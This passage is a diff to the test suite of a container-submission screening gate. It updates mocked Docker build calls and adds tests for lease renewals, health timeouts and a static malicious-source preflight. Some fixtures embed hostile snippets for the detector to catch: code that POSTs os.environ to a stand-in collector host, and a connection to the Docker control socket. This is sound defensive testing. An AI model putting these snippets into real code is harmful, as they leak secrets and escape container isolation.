@@ -23,8 +23,10 @@ import httpx
 import pytest
 
 from ditto_screener import gate as gate_module
+from ditto_screener import tool_catalog_probe
 from ditto_screener.config import ScreenerConfig
 from ditto_screener.errors import ScreenedImageUploadUnavailable
+from ditto_screener.fake_gateway import measure_model_request
 from ditto_screener.gate import (
     _MAX_ARCHIVE_MEMBERS,
     _MAX_SCREENED_IMAGE_BYTES,
@@ -816,7 +818,7 @@ def _ok_run(calls: list[list[str]] | None = None) -> Callable[..., Any]:
     async def run(args: list[str], *, stdin: Any = None, **_: Any) -> tuple[int, str]:
         if calls is not None:
             calls.append(args)
-        if args[0] == "build" and stdin is not None:
+        if args[:2] == ["buildx", "build"] and stdin is not None:
             stdin.read()
             _write_iidfile(args)
         if args[:4] == ["image", "inspect", "--format", "{{.Id}}"]:
@@ -934,7 +936,7 @@ async def test_running_build_observes_lease_renewal_and_absolute_cap(
 
     async def run(args: list[str], **kwargs: Any) -> tuple[int, str]:
         nonlocal original_expiry
-        if args[0] != "build":
+        if args[:2] != ["buildx", "build"]:
             return await ok_run(args, **kwargs)
         assert kwargs["timeout"] == cap_seconds
         assert kwargs["deadline"] is deadline
@@ -1310,7 +1312,7 @@ async def test_publish_failure_demotes_pass_with_dedicated_reason(
     saved_archive, _, _ = _oci_image_save_archive()
 
     async def run(args: list[str], *, stdin: Any = None, **_: Any) -> tuple[int, str]:
-        if args[0] == "build":
+        if args[:2] == ["buildx", "build"]:
             if stdin is not None:
                 stdin.read()
             _write_iidfile(args)
@@ -1351,7 +1353,7 @@ async def test_publish_platform_outage_is_fleet_infra(
     saved_archive, _, _ = _oci_image_save_archive()
 
     async def run(args: list[str], *, stdin: Any = None, **_: Any) -> tuple[int, str]:
-        if args[0] == "build":
+        if args[:2] == ["buildx", "build"]:
             if stdin is not None:
                 stdin.read()
             _write_iidfile(args)
@@ -1386,6 +1388,228 @@ async def test_publish_platform_outage_is_fleet_infra(
     assert "initiate rejected (502)" in result.detail
 
 
+def _exportable_run(saved_archive: bytes) -> Callable[..., Any]:
+    async def run(args: list[str], *, stdin: Any = None, **_: Any) -> tuple[int, str]:
+        if args[:2] == ["buildx", "build"]:
+            if stdin is not None:
+                stdin.read()
+            _write_iidfile(args)
+        elif args[:4] == ["image", "inspect", "--format", "{{.Id}}"]:
+            return 0, "sha256:" + "34" * 32
+        elif args[:3] == ["image", "inspect", "--format"]:
+            if "Config.Volumes" in args[3]:
+                return 0, ""
+            return 0, str(len(saved_archive))
+        elif args[:3] == ["image", "save", "--output"]:
+            Path(args[3]).write_bytes(saved_archive)
+        return 0, ""
+
+    return run
+
+
+@pytest.mark.parametrize("renew", [True, False])
+async def test_image_upload_follows_lease_renewals(
+    make_config: Callable[..., ScreenerConfig], renew: bool
+) -> None:
+    """#2988: the upload was bounded by the lease left when it started."""
+    tarball = _valid_tar()
+    saved_archive, _, _ = _oci_image_save_archive()
+    gate = _gate_with(make_config(), _exportable_run(saved_archive), tarball=tarball)
+    loop = asyncio.get_running_loop()
+    lease = LeaseDeadline(loop.time() + 600)
+    original_export = gate._export_image
+    uploads: list[str] = []
+    upload_cancelled = False
+
+    async def export_image(*args: Any, **kwargs: Any) -> BuiltImageArtifact:
+        exported = await original_export(*args, **kwargs)
+        # The upload starts with 0.5s of lease left; heartbeats keep renewing.
+        lease.expires_at = loop.time() + 0.5
+        return exported
+
+    async def publish(image: BuiltImageArtifact) -> None:
+        nonlocal upload_cancelled
+        try:
+            await asyncio.sleep(0.1)
+            if renew:
+                lease.renew(loop.time() + 600)
+            await asyncio.sleep(0.7 if renew else 30)
+        except asyncio.CancelledError:
+            upload_cancelled = True
+            raise
+        uploads.append(image.sha256)
+
+    gate._export_image = export_image  # type: ignore[method-assign]
+    async with gate._client:
+        result = await asyncio.wait_for(
+            gate.screen(
+                agent_id=_AGENT,
+                attempt_id=_ATTEMPT,
+                bench_version=12,
+                miner_hotkey=_MINER,
+                sha256=hashlib.sha256(tarball).hexdigest(),
+                download_url=_URL,
+                deadline=lease,
+                publish_image=publish,
+            ),
+            timeout=5,
+        )
+
+    if renew:
+        assert result.outcome == ScreeningOutcome.PASS
+        assert len(uploads) == 1
+    else:
+        assert result.outcome == ScreeningOutcome.RETRYABLE_INFRA
+        assert result.evidence[-1].code == "lease-budget-exhausted"
+        assert "during image upload" in result.detail
+        assert upload_cancelled
+        assert uploads == []
+
+
+@pytest.mark.parametrize("renew", [True, False])
+async def test_image_export_follows_lease_renewals(
+    make_config: Callable[..., ScreenerConfig], renew: bool
+) -> None:
+    """#2988: ``docker save`` was capped at the lease left when export began."""
+    archive, _, _ = _oci_image_save_archive()
+    gate = _gate_with(
+        make_config(docker_bin=sys.executable), _ok_run(), tarball=_valid_tar()
+    )
+    loop = asyncio.get_running_loop()
+    lease = LeaseDeadline(loop.time() + 0.3)
+
+    async def run(args: list[str], **kwargs: Any) -> tuple[int, str]:
+        if args[:3] == ["image", "inspect", "--format"]:
+            return 0, str(len(archive))
+        assert args[:3] == ["image", "save", "--output"]
+        code, output = await BuildGate._run(
+            gate, ["-c", "import time; time.sleep(0.8)"], **kwargs
+        )
+        if code == 0:
+            Path(args[3]).write_bytes(archive)
+        return code, output
+
+    async def renew_lease() -> None:
+        await asyncio.sleep(0.1)
+        lease.renew(loop.time() + 600)
+
+    gate._run = run  # type: ignore[method-assign]
+    renewal = asyncio.create_task(renew_lease()) if renew else None
+    try:
+        if renew:
+            exported = await gate._export_image(
+                "sha256:" + "34" * 32,
+                image_ref=f"ditto-screen/{_AGENT}:latest",
+                deadline=lease,
+            )
+            os.unlink(exported.path)
+        else:
+            # An unrenewed lease still stops the export as a lease expiry, not
+            # as a host export failure.
+            with pytest.raises(gate_module._LeaseDeadlineError):
+                await gate._export_image(
+                    "sha256:" + "34" * 32,
+                    image_ref=f"ditto-screen/{_AGENT}:latest",
+                    deadline=lease,
+                )
+    finally:
+        if renewal is not None:
+            await renewal
+        await gate._client.aclose()
+
+
+async def test_image_export_timeout_tie_with_expired_lease_raises_lease_error(
+    make_config: Callable[..., ScreenerConfig],
+) -> None:
+    """Generic timeout output with an expired lease still classifies as lease expiry."""
+    archive, _, _ = _oci_image_save_archive()
+    gate = _gate_with(make_config(), _ok_run(), tarball=_valid_tar())
+    loop = asyncio.get_running_loop()
+    lease = LeaseDeadline(loop.time() + 60.0)
+
+    async def run(args: list[str], **_: Any) -> tuple[int, str]:
+        if args[:3] == ["image", "inspect", "--format"]:
+            return 0, str(len(archive))
+        assert args[:3] == ["image", "save", "--output"]
+        # Simulate the fixed 600s export timeout winning the tie as the lease expires.
+        lease.expires_at = loop.time() - 0.1
+        return 124, "[timeout after 600s]"
+
+    gate._run = run  # type: ignore[method-assign]
+    async with gate._client:
+        with pytest.raises(gate_module._LeaseDeadlineError):
+            await gate._export_image(
+                "sha256:" + "34" * 32,
+                image_ref=f"ditto-screen/{_AGENT}:latest",
+                deadline=lease,
+            )
+
+
+async def test_health_wait_is_bounded_by_wall_clock_time(
+    make_config: Callable[..., ScreenerConfig],
+) -> None:
+    """#2988: a hung /health held the slot for probe time on top of ``timeout``."""
+    gate = _gate_with(make_config(), _ok_run(), tarball=_valid_tar())
+    call_timeouts: list[float] = []
+
+    async def hung_request(
+        _container: str, _url: str, *, timeout: float
+    ) -> tuple[int, str]:
+        call_timeouts.append(timeout)
+        await asyncio.sleep(timeout)
+        return 1, "transport request failed"
+
+    async def hung_inspect(
+        _args: list[str], *, timeout: float, **_: Any
+    ) -> tuple[int, str]:
+        call_timeouts.append(timeout)
+        await asyncio.sleep(timeout)
+        return 124, f"[timeout after {timeout:g}s]"
+
+    gate._request_from_sidecar = hung_request  # type: ignore[method-assign]
+    gate._run = hung_inspect  # type: ignore[method-assign]
+    loop = asyncio.get_running_loop()
+    started = loop.time()
+    async with gate._client:
+        healthy, detail = await asyncio.wait_for(
+            gate._wait_healthy(
+                "http://harness:8080",
+                probe_container="gateway",
+                harness_container="harness",
+                timeout=0.3,
+            ),
+            timeout=5,
+        )
+    elapsed = loop.time() - started
+    assert not healthy
+    assert detail.startswith("/health never healthy within 0.3s")
+    assert elapsed < 0.6
+    assert call_timeouts and max(call_timeouts) <= 0.3
+
+
+async def test_health_wait_cuts_a_request_that_outlives_its_timeout(
+    make_config: Callable[..., ScreenerConfig],
+) -> None:
+    """httpx timeouts apply per phase, so the wait owns the wall-clock bound."""
+
+    async def hang(_request: httpx.Request) -> httpx.Response:
+        await asyncio.sleep(30)
+        return httpx.Response(200)
+
+    async with httpx.AsyncClient(transport=httpx.MockTransport(hang)) as client:
+        gate = BuildGate(
+            make_config(),
+            client,
+            policy=PolicyEngine(CORE_ONLY_MANIFEST),
+            journal=ReviewJournal(None),
+        )
+        healthy, detail = await asyncio.wait_for(
+            gate._wait_healthy("http://harness:8080", timeout=0.3), timeout=5
+        )
+    assert not healthy
+    assert "never healthy within 0.3s" in detail
+
+
 async def test_publish_uses_stable_agent_ref_with_attempt_scoped_build(
     make_config: Callable[..., ScreenerConfig],
 ) -> None:
@@ -1396,7 +1620,7 @@ async def test_publish_uses_stable_agent_ref_with_attempt_scoped_build(
 
     async def run(args: list[str], *, stdin: Any = None, **_: Any) -> tuple[int, str]:
         calls.append(args)
-        if args[0] == "build":
+        if args[:2] == ["buildx", "build"]:
             if stdin is not None:
                 stdin.read()
             _write_iidfile(args)
@@ -1429,7 +1653,9 @@ async def test_publish_uses_stable_agent_ref_with_attempt_scoped_build(
     assert result.outcome == ScreeningOutcome.PASS
     assert [image.image_ref for image in published] == [f"ditto-screen/{_AGENT}:latest"]
     assert [image.image_id for image in published] == [config_id]
-    assert any(call[0] == "build" and attempt_ref in call for call in calls)
+    assert any(
+        call[:2] == ["buildx", "build"] and attempt_ref in call for call in calls
+    )
     assert ["rmi", "-f", attempt_ref] in calls
 
 
@@ -1562,7 +1788,7 @@ async def test_static_malicious_preflight_quarantines_before_docker(
         result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
 
     assert result.outcome == ScreeningOutcome.QUARANTINE
-    assert not any(call[0] in {"build", "run", "exec"} for call in calls)
+    assert not any(call[0] in {"build", "buildx", "run", "exec"} for call in calls)
     assert result.finding is not None
     assert result.finding["prompt_revision"] == "static-malicious-preflight-v1"
     assert "/var/run/docker.sock" not in str(result.finding)
@@ -1596,7 +1822,7 @@ async def test_static_preflight_v2_enforce_keeps_reachable_causal_quarantine(
         result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
 
     assert result.outcome == ScreeningOutcome.QUARANTINE
-    assert not any(call[0] in {"build", "run", "exec"} for call in calls)
+    assert not any(call[0] in {"build", "buildx", "run", "exec"} for call in calls)
     assert result.finding is not None
     assert result.finding["prompt_revision"] == "static-malicious-preflight-v2"
 
@@ -1628,7 +1854,106 @@ async def test_static_preflight_v2_enforce_does_not_hold_excluded_local_helper(
         result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
 
     assert result.outcome == ScreeningOutcome.PASS
-    assert any(call[0] == "build" for call in calls)
+    assert any(call[:2] == ["buildx", "build"] for call in calls)
+
+
+async def test_mechanical_lane_rejects_static_malicious_source_before_docker(
+    make_config: Callable[..., ScreenerConfig],
+    caplog: pytest.LogCaptureFixture,
+) -> None:
+    """Source review is retired; the static safety preflight still runs.
+
+    On the build-only lane a decisive, reachable static match is a
+    deterministic reject with location-only evidence. Nothing is held and no
+    submission-controlled build or runtime starts.
+    """
+    tarball = _valid_tar(
+        **{
+            "Dockerfile": b"FROM scratch\nCOPY src/main.rs /src/main.rs\n",
+            "src/main.rs": (
+                b'let endpoint = "/var/run/docker.sock";\n'
+                b"connect_control_socket(endpoint);\n"
+            ),
+        }
+    )
+    calls: list[list[str]] = []
+    gate = _gate_with(make_config(), _ok_run(calls), tarball=tarball)
+    async with gate._client:
+        result = await _screen(
+            gate, hashlib.sha256(tarball).hexdigest(), build_only=True
+        )
+
+    assert result.outcome == ScreeningOutcome.DETERMINISTIC_REJECT
+    assert result.reason_code == "static-malicious-source"
+    assert not any(call[0] in {"build", "buildx", "run", "exec"} for call in calls)
+    assert "src/main.rs:" in result.detail
+    assert "/var/run/docker.sock" not in result.detail
+    assert "static-source safety reject" in caplog.text
+    assert "execution_started=false" in caplog.text
+
+
+async def test_mechanical_lane_rejects_v2_reachable_causal_match(
+    make_config: Callable[..., ScreenerConfig],
+) -> None:
+    tarball = _valid_tar(
+        **{
+            "Dockerfile": (
+                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
+                b'ENTRYPOINT ["python", "/app/app.py"]\n'
+            ),
+            "app.py": (
+                b"secret = os.environ.copy()\n"
+                b"requests.post('https://collector.invalid', json=secret)\n"
+            ),
+        }
+    )
+    calls: list[list[str]] = []
+    gate = _gate_with(
+        make_config(static_preflight_v2_mode="enforce"),
+        _ok_run(calls),
+        tarball=tarball,
+    )
+    async with gate._client:
+        result = await _screen(
+            gate, hashlib.sha256(tarball).hexdigest(), build_only=True
+        )
+
+    assert result.outcome == ScreeningOutcome.DETERMINISTIC_REJECT
+    assert result.reason_code == "static-malicious-source"
+    assert not any(call[0] in {"build", "buildx", "run", "exec"} for call in calls)
+    assert "app.py:" in result.detail
+
+
+async def test_mechanical_lane_passes_excluded_local_helper(
+    make_config: Callable[..., ScreenerConfig],
+) -> None:
+    """A match only in a file the build never copies is not a safety reject."""
+    tarball = _valid_tar(
+        **{
+            "Dockerfile": (
+                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
+                b'ENTRYPOINT ["python", "/app/app.py"]\n'
+            ),
+            "app.py": b"print('ready')\n",
+            "tools/local.py": (
+                b"secret = os.environ.copy()\n"
+                b"requests.post('https://collector.invalid', json=secret)\n"
+            ),
+        }
+    )
+    calls: list[list[str]] = []
+    gate = _gate_with(
+        make_config(static_preflight_v2_mode="enforce"),
+        _ok_run(calls),
+        tarball=tarball,
+    )
+    async with gate._client:
+        result = await _screen(
+            gate, hashlib.sha256(tarball).hexdigest(), build_only=True
+        )
+
+    assert result.outcome == ScreeningOutcome.PASS
+    assert any(call[:2] == ["buildx", "build"] for call in calls)
 
 
 async def test_static_preflight_v2_enforce_reviews_unresolved_v1_before_build(
@@ -1653,7 +1978,7 @@ async def test_static_preflight_v2_enforce_reviews_unresolved_v1_before_build(
         result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
 
     assert result.outcome == ScreeningOutcome.QUARANTINE
-    assert not any(call[0] in {"build", "run", "exec"} for call in calls)
+    assert not any(call[0] in {"build", "buildx", "run", "exec"} for call in calls)
     assert result.finding is not None
     assert result.finding["prompt_revision"] == "static-malicious-preflight-v1"
 
@@ -1685,7 +2010,7 @@ async def test_static_preflight_v2_enforce_reviews_helper_before_build(
         result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
 
     assert result.outcome == ScreeningOutcome.QUARANTINE
-    assert not any(call[0] in {"build", "run", "exec"} for call in calls)
+    assert not any(call[0] in {"build", "buildx", "run", "exec"} for call in calls)
     assert result.finding is not None
     assert result.finding["prompt_revision"] == "static-malicious-preflight-v1"
 
@@ -1721,7 +2046,7 @@ async def test_static_preflight_v2_shadow_clears_excluded_helper_and_journals_de
         result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
 
     assert result.outcome == ScreeningOutcome.PASS
-    assert any(call[0] == "build" for call in calls)
+    assert any(call[:2] == ["buildx", "build"] for call in calls)
     record = json.loads(audit_path.read_text())
     assert record["mode"] == "shadow"
     assert record["legacy_decisive"] is False
@@ -1764,7 +2089,7 @@ async def test_static_preflight_audit_failure_is_explicit_retryable_infrastructu
     assert [evidence.code for evidence in result.evidence] == [
         "static-preflight-audit-failed"
     ]
-    assert not any(call[0] in {"build", "run", "exec"} for call in calls)
+    assert not any(call[0] in {"build", "buildx", "run", "exec"} for call in calls)
     assert destination.read_text() == "unchanged\n"
 
 
@@ -1899,7 +2224,7 @@ async def test_l3_cleared_static_lead_can_continue_to_build(
     assert result.outcome == ScreeningOutcome.PASS
     assert reviewer.resolve_calls == 1
     assert reviewer.l1_calls == 0
-    assert any(call[0] == "build" for call in calls)
+    assert any(call[:2] == ["buildx", "build"] for call in calls)
 
 
 async def test_v13_uncertified_static_preflight_low_holds_before_build(
@@ -1932,7 +2257,7 @@ async def test_v13_uncertified_static_preflight_low_holds_before_build(
         )
     assert result.outcome == ScreeningOutcome.QUARANTINE
     assert result.evidence[0].code == "source-review-clearance-unproven"
-    assert not any(call[0] == "build" for call in calls)
+    assert not any(call[0] in {"build", "buildx"} for call in calls)
 
 
 async def test_v13_l4_cleared_static_lead_continues_to_build(
@@ -1966,7 +2291,7 @@ async def test_v13_l4_cleared_static_lead_continues_to_build(
     assert result.reason_code == "source-review-awaiting-v13-verification"
     assert reviewer.resolve_calls == 1
     assert reviewer.l1_calls == 0
-    assert any(call[0] == "build" for call in calls)
+    assert any(call[:2] == ["buildx", "build"] for call in calls)
 
 
 async def test_static_preflight_reports_source_review_before_build(
@@ -2119,7 +2444,7 @@ async def test_source_review_starts_only_after_build_and_health(
     events: list[str] = []
 
     async def run(args: list[str], *, stdin: Any = None, **_: Any) -> tuple[int, str]:
-        if args[0] == "build":
+        if args[:2] == ["buildx", "build"]:
             if stdin is not None:
                 stdin.read()
             events.append("build_finished")
@@ -2279,7 +2604,7 @@ async def test_slow_build_does_not_age_out_a_receipt_fresh_v13_lease(
     ok_run = _ok_run()
 
     async def slow_build(args: list[str], **kwargs: Any) -> tuple[int, str]:
-        if args[0] == "build":
+        if args[:2] == ["buildx", "build"]:
             clock[0] += 400
         return await ok_run(args, **kwargs)
 
@@ -2345,7 +2670,9 @@ async def test_policy_only_rescreen_starts_source_review_without_runtime(
 
     assert result.outcome == ScreeningOutcome.PASS
     assert events == ["review_started", "review_finished"]
-    assert not any(call[0] in {"build", "run", "exec"} for call in docker_calls)
+    assert not any(
+        call[0] in {"build", "buildx", "run", "exec"} for call in docker_calls
+    )
 
 
 async def test_source_only_fixture_builds_and_reviews_without_serving(
@@ -2376,7 +2703,7 @@ async def test_source_only_fixture_builds_and_reviews_without_serving(
     assert result.outcome == ScreeningOutcome.PASS
     assert events == ["review_started", "review_finished"]
     assert built_images == ["sha256:" + "34" * 32]
-    assert any(call[0] == "build" for call in docker_calls)
+    assert any(call[:2] == ["buildx", "build"] for call in docker_calls)
     assert not any(
         call[0] in {"create", "run", "start", "exec"} for call in docker_calls
     )
@@ -2470,7 +2797,7 @@ async def test_source_review_is_not_started_when_the_build_fails(
     reviewer = _StubReviewer(events)
 
     async def run(args: list[str], *, stdin: Any = None, **_: Any) -> tuple[int, str]:
-        if args[0] == "build":
+        if args[:2] == ["buildx", "build"]:
             if stdin is not None:
                 stdin.read()
             return 1, "error[E0308]: mismatched types"
@@ -2565,7 +2892,7 @@ async def test_fake_gateway_is_internal_and_resource_capped(
     runtime_network = networks[0]
     assert runtime_network[-1].startswith("ditto-screen-")
     assert "--internal" in runtime_network
-    build = next(call for call in calls if call[0] == "build")
+    build = next(call for call in calls if call[:2] == ["buildx", "build"])
     assert "--load" in build
     assert build[build.index("--network") + 1] == "default"
     assert {"--memory", "8g", "--memory-swap", "--cpu-quota", "--shm-size"} <= set(
@@ -2611,7 +2938,7 @@ async def test_fake_gateway_is_internal_and_resource_capped(
     assert "SSL_CERT_FILE=/run/dittobench/openrouter-shim-ca.pem" in harness
     assert "fake-gateway" not in " ".join(harness)
     # The published envelope cap when Platform stamps none; never a stale 3g.
-    assert {"--memory", "8192m", "--memory-swap", "--pids-limit", "512"} <= set(harness)
+    assert {"--memory", "2048m", "--memory-swap", "--pids-limit", "512"} <= set(harness)
     assert {"--init", "--user", "65532:65532", "--read-only"} <= set(harness)
     assert {"--ipc", "none", "--log-driver", "local"} <= set(harness)
     assert {"max-size=8m", "max-file=1", "compress=false"} <= set(harness)
@@ -2660,7 +2987,7 @@ async def test_unloaded_buildx_result_is_retryable_infrastructure(
         args: list[str], *, stdin: Any = None, **_: Any
     ) -> tuple[int, str]:
         calls.append(args)
-        if args[0] == "build" and stdin is not None:
+        if args[:2] == ["buildx", "build"] and stdin is not None:
             stdin.read()
             _write_iidfile(args)
             return 0, "build completed"
@@ -2672,7 +2999,7 @@ async def test_unloaded_buildx_result_is_retryable_infrastructure(
     async with gate._client:
         result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
 
-    build = next(call for call in calls if call[0] == "build")
+    build = next(call for call in calls if call[:2] == ["buildx", "build"])
     assert "--load" in build
     assert result.outcome == ScreeningOutcome.RETRYABLE_INFRA
     assert result.evidence[-1].code == "docker-build-infrastructure"
@@ -2687,7 +3014,7 @@ async def test_lost_buildkit_session_is_retryable_infrastructure(
     async def session_lost(
         args: list[str], *, stdin: Any = None, **_: Any
     ) -> tuple[int, str]:
-        if args[0] == "build" and stdin is not None:
+        if args[:2] == ["buildx", "build"] and stdin is not None:
             stdin.read()
             return 1, (
                 "ERROR: failed to solve: rpc error: code = Unknown desc = no "
@@ -2717,7 +3044,7 @@ async def test_build_uses_daemon_image_id_resolved_from_unique_tag(
 
     async def run(args: list[str], *, stdin: Any = None, **_: Any) -> tuple[int, str]:
         calls.append(args)
-        if args[0] == "build" and stdin is not None:
+        if args[:2] == ["buildx", "build"] and stdin is not None:
             stdin.read()
             Path(args[args.index("--iidfile") + 1]).write_text(build_result_id)
             return 0, "build completed"
@@ -2759,7 +3086,7 @@ async def test_sha_mismatch_is_deterministic_and_cleans_temp_file(
         result = await _screen(gate, "00" * 32)
     assert result.outcome == ScreeningOutcome.DETERMINISTIC_REJECT
     assert "sha256 mismatch" in result.detail
-    assert not any(call[0] == "build" for call in calls)
+    assert not any(call[0] in {"build", "buildx"} for call in calls)
     assert not artifact_path.exists()
 
 
@@ -2776,7 +3103,7 @@ async def test_container_contract_failure_is_terminal_reject(
         "error[SCR-CONTRACT-001]: Dockerfile is missing from the archive root"
     )
     assert "help:" in result.detail
-    assert not any(call[0] == "build" for call in calls)
+    assert not any(call[0] in {"build", "buildx"} for call in calls)
 
 
 @pytest.mark.parametrize("entitlement", ["--network=host", "--security=insecure"])
@@ -2797,7 +3124,7 @@ async def test_container_contract_rejects_insecure_build_entitlements(
         result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
     assert result.outcome == ScreeningOutcome.DETERMINISTIC_REJECT
     assert "SCR-CONTRACT-004" in result.detail
-    assert not any(call[0] == "build" for call in calls)
+    assert not any(call[0] in {"build", "buildx"} for call in calls)
 
 
 async def test_rootless_executor_policy_fails_closed_before_download(
@@ -2820,7 +3147,7 @@ async def test_rootless_executor_policy_fails_closed_before_download(
     assert result.outcome == ScreeningOutcome.RETRYABLE_INFRA
     assert result.evidence[-1].code == "executor-isolation-unavailable"
     assert calls[0] == ["info", "--format", "{{json .SecurityOptions}}"]
-    assert not any(call[0] in {"build", "run"} for call in calls)
+    assert not any(call[0] in {"build", "buildx", "run"} for call in calls)
     assert not any(call[:2] == ["network", "create"] for call in calls)
 
 
@@ -2905,7 +3232,7 @@ async def test_container_contract_is_language_neutral(
         result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
 
     assert result.outcome == ScreeningOutcome.PASS
-    build = next(call for call in calls if call[0] == "build")
+    build = next(call for call in calls if call[:2] == ["buildx", "build"])
     assert build[build.index("--memory") + 1] == "8g"
     assert build[build.index("--memory-swap") + 1] == "8g"
 
@@ -2923,7 +3250,7 @@ async def test_container_contract_rejects_noncanonical_member_alias(
 
     assert result.outcome == ScreeningOutcome.DETERMINISTIC_REJECT
     assert "non-canonical path" in result.detail
-    assert not any(call[0] == "build" for call in calls)
+    assert not any(call[0] in {"build", "buildx"} for call in calls)
 
 
 async def test_container_contract_rejects_member_flood_before_build(
@@ -2945,7 +3272,7 @@ async def test_container_contract_rejects_member_flood_before_build(
     assert _MAX_ARCHIVE_MEMBERS == 20_000
     assert result.outcome == ScreeningOutcome.DETERMINISTIC_REJECT
     assert "too many members" in result.detail
-    assert not any(call[0] == "build" for call in calls)
+    assert not any(call[0] in {"build", "buildx"} for call in calls)
 
 
 async def test_prebuilt_binary_entrypoint_is_advisory_quarantine(
@@ -2975,7 +3302,7 @@ async def test_prebuilt_binary_entrypoint_is_advisory_quarantine(
         item.code == "image-binding-heuristic" and item.module_id == "stable-core"
         for item in result.evidence
     )
-    assert any(call[0] == "build" for call in calls)
+    assert any(call[:2] == ["buildx", "build"] for call in calls)
 
 
 def test_image_binding_escalation_preserves_review_and_policy_identity() -> None:
@@ -3099,7 +3426,7 @@ async def test_build_only_skips_image_binding_advisory_and_passes(
     assert result.outcome == ScreeningOutcome.PASS
     assert result.submits_verdict
     # It still builds the image (that is the whole point of a build-only pass).
-    assert any(call[0] == "build" for call in calls)
+    assert any(call[:2] == ["buildx", "build"] for call in calls)
 
 
 async def test_screen_decision_binds_the_claimed_policy_version(
@@ -3128,7 +3455,7 @@ async def test_build_and_health_failures_are_deterministic(
     async def build_failure(
         args: list[str], *, stdin: Any = None, **_: Any
     ) -> tuple[int, str]:
-        if args[0] == "build":
+        if args[:2] == ["buildx", "build"]:
             if stdin is not None:
                 stdin.read()
             return 1, "error[E0432]: unresolved import"
@@ -3143,7 +3470,7 @@ async def test_build_and_health_failures_are_deterministic(
     async def unhealthy(
         args: list[str], *, stdin: Any = None, **_: Any
     ) -> tuple[int, str]:
-        if args[0] == "build" and stdin is not None:
+        if args[:2] == ["buildx", "build"] and stdin is not None:
             stdin.read()
             _write_iidfile(args)
         if args[:4] == ["image", "inspect", "--format", "{{.Id}}"]:
@@ -3180,7 +3507,7 @@ async def test_exited_harness_fails_health_immediately_with_retained_logs(
         args: list[str], *, stdin: Any = None, **_: Any
     ) -> tuple[int, str]:
         calls.append(args)
-        if args[0] == "build" and stdin is not None:
+        if args[:2] == ["buildx", "build"] and stdin is not None:
             stdin.read()
             _write_iidfile(args)
         if args[:4] == ["image", "inspect", "--format", "{{.Id}}"]:
@@ -3218,7 +3545,7 @@ async def test_image_declared_volume_is_rejected_before_runtime(
         args: list[str], *, stdin: Any = None, **_: Any
     ) -> tuple[int, str]:
         calls.append(args)
-        if args[0] == "build" and stdin is not None:
+        if args[:2] == ["buildx", "build"] and stdin is not None:
             stdin.read()
             _write_iidfile(args)
         if args[:4] == ["image", "inspect", "--format", "{{.Id}}"]:
@@ -3256,7 +3583,7 @@ async def test_expired_lease_budget_short_circuits_before_download(
         )
     assert result.outcome == ScreeningOutcome.RETRYABLE_INFRA
     assert "lease budget exhausted" in result.detail
-    assert not any(args and args[0] == "build" for args in calls)
+    assert not any(args and args[0] in {"build", "buildx"} for args in calls)
 
 
 async def test_gateway_start_failure_is_retryable_infrastructure(
@@ -3267,7 +3594,7 @@ async def test_gateway_start_failure_is_retryable_infrastructure(
     async def no_daemon(
         args: list[str], *, stdin: Any = None, **_: Any
     ) -> tuple[int, str]:
-        if args[0] == "build" and stdin is not None:
+        if args[:2] == ["buildx", "build"] and stdin is not None:
             stdin.read()
             _write_iidfile(args)
         if args[:4] == ["image", "inspect", "--format", "{{.Id}}"]:
@@ -3310,7 +3637,7 @@ async def test_docker_daemon_build_failure_is_retryable_infrastructure(
     async def no_daemon(
         args: list[str], *, stdin: Any = None, **_: Any
     ) -> tuple[int, str]:
-        if args[0] == "build":
+        if args[:2] == ["buildx", "build"]:
             if stdin is not None:
                 stdin.read()
             return 1, "Cannot connect to the Docker daemon"
@@ -3348,7 +3675,7 @@ async def test_transient_build_failures_are_retryable_infrastructure(
     async def transient_failure(
         args: list[str], *, stdin: Any = None, **_: Any
     ) -> tuple[int, str]:
-        if args[0] == "build":
+        if args[:2] == ["buildx", "build"]:
             if stdin is not None:
                 stdin.read()
             return 1, failure
@@ -3371,7 +3698,7 @@ async def test_signal_interrupted_build_is_retryable_infrastructure(
     async def interrupted(
         args: list[str], *, stdin: Any = None, **_: Any
     ) -> tuple[int, str]:
-        if args[0] == "build":
+        if args[:2] == ["buildx", "build"]:
             if stdin is not None:
                 stdin.read()
             return exit_code, "step 3/9"
@@ -3912,7 +4239,7 @@ async def test_envelope_usage_is_recorded_for_a_passing_image(
     # A passing image is exactly the case rejections cannot answer: how much of
     # the envelope the fleet actually uses.
     assert "393 MiB" in usage.summary
-    assert "8192 MiB" in usage.summary
+    assert "2048 MiB" in usage.summary
     assert "12 MiB" in usage.summary
 
 
@@ -4023,6 +4350,224 @@ def test_seed_evidence_never_exceeds_the_decision_bound() -> None:
     assert result.reason_code == "health-ok"
 
 
+def test_both_probes_keep_their_records_on_a_saturated_decision() -> None:
+    # Capping per probe let the seed records evict the catalog records that
+    # were appended just before them, losing the shadow measurement.
+    saturated = ScreeningDecision(
+        outcome=ScreeningOutcome.PASS,
+        detail="",
+        manifest_digest=CORE_ONLY_MANIFEST.digest,
+        reason_code="health-ok",
+        evidence=tuple(
+            PolicyEvidence("stable-core", f"filler-{index}", "x") for index in range(16)
+        ),
+    )
+    seed = gate_module._SeedProbe(
+        False,
+        "seed-memory-cap",
+        "the harness exceeded the sandbox memory cap",
+        usage=gate_module._SandboxUsage(412_000_000, 12_345, 536_870_912),
+    )
+    catalog = tool_catalog_probe.ProbeVerdict(
+        False,
+        tool_catalog_probe.CONTEXT_OVERFLOW_CODE,
+        "the harness forwarded 2000 tool definitions",
+        "highest-floor request has 2000 tools",
+    )
+
+    result = gate_module._with_probe_evidence(
+        saturated,
+        [
+            *gate_module._tool_catalog_probe_records(catalog),
+            *gate_module._seed_probe_records(seed),
+        ],
+    )
+
+    assert len(result.evidence) == 16
+    assert [item.code for item in result.evidence[-4:]] == [
+        tool_catalog_probe.CONTEXT_OVERFLOW_CODE,
+        tool_catalog_probe.OBSERVATION_CODE,
+        "seed-memory-cap",
+        "seed-envelope-usage",
+    ]
+    assert result.outcome == ScreeningOutcome.PASS
+    assert result.reason_code == "health-ok"
+
+
+def _catalog_probe_run(
